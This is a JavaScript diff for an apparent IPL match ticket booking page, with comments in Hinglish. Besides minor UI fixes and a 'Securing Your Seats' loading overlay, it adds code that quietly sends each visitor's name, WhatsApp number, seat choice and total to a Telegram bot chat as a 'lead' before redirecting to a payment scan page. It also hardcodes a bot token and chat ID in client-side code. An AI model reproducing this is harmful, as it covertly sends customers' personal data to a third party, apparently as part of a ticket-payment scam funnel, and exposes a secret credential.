@@ -49,9 +49,11 @@ document.addEventListener("DOMContentLoaded", async () => {
         
         // Button Active Karo
         const btn = document.getElementById('final-btn');
-        btn.disabled = false;
-        btn.classList.add('active');
-        btn.innerText = "Continue to Payment";
+        if(btn) {
+            btn.disabled = false;
+            btn.classList.add('active');
+            btn.innerText = "Continue to Payment";
+        }
 
         refreshTotal();
     };
@@ -74,14 +76,69 @@ document.addEventListener("DOMContentLoaded", async () => {
         
         // Final Price save karo payment page ke liye
         localStorage.setItem("finalPrice", total);
+        localStorage.setItem("selectedTotalPrice", total); // Added for backward compatibility with payment page
         localStorage.setItem("selectedSeatType", window.sType);
         localStorage.setItem("seatQuantity", window.sQty);
     }
 
-    // 5. Next Page Redirection
-    window.goNext = () => {
+    // 5. Next Page Redirection (WITH LOADING ANIMATION & TELEGRAM ALERT)
+    window.goNext = async () => {
         if (window.sPrice > 0) {
-            window.location.href = "payment.html";
+            
+            // 1. Button ko block karo taki double click na ho
+            const btn = document.getElementById('final-btn');
+            if(btn) {
+                btn.innerText = "Processing...";
+                btn.style.pointerEvents = "none";
+            }
+
+            // 🔥 2. FULL SCREEN LOADING OVERLAY DIKHAO 🔥
+            const loader = document.createElement('div');
+            loader.innerHTML = `
+                <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.95); z-index:99999; display:flex; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(5px);">
+                    <div style="width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #00cf7f; border-radius: 50%; animation: load-spin 1s linear infinite;"></div>
+                    <h3 style="margin-top:20px; color:#333; font-family:sans-serif; font-size:18px; font-weight:700;">Securing Your Seats...</h3>
+                    <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Redirecting to Payment Gateway</p>
+                    <style>
+                        @keyframes load-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+                    </style>
+                </div>
+            `;
+            document.body.appendChild(loader);
+
+            // 3. Get Data for Telegram Alert
+            const name = localStorage.getItem('customerName') || "Unknown";
+            const phone = localStorage.getItem('customerPhone') || "Unknown";
+            let matchTitle = "IPL Match";
+            if (matchTitleEl && matchTitleEl.innerText) matchTitle = matchTitleEl.innerText;
+            const totalAmt = window.sQty * window.sPrice;
+
+            // 🔥 Aapka Original Purana Bot Token aur sirf Aapki Chat ID 🔥
+            const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
+            const chatId = "6820660513"; 
+            
+            const telegramMsg = `💰 *LEAD REACHED PAYMENT PAGE!* 💰\n\n` +
+                                `👤 *Name:* ${name}\n` +
+                                `📞 *WhatsApp:* ${phone}\n` +
+                                `🏏 *Match:* ${matchTitle}\n` +
+                                `🎟️ *Seats:* ${window.sQty} x ${window.sType}\n` +
+                                `💵 *Total Amount:* ₹${totalAmt}\n` +
+                                `👉 *Action:* Proceeding to Payment Scan Page!`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
+
+            // 4. Send Message & Redirect
+            try {
+                await fetch(url);
+            } catch (e) {
+                console.log("Telegram Error");
+            } finally {
+                // Thoda sa natural delay taki animation achha lage (0.5 second)
+                setTimeout(() => {
+                    window.location.href = "payment.html";
+                }, 500);
+            }
+
         } else {
             alert("Kripya pehle seat type select karein!");
         }
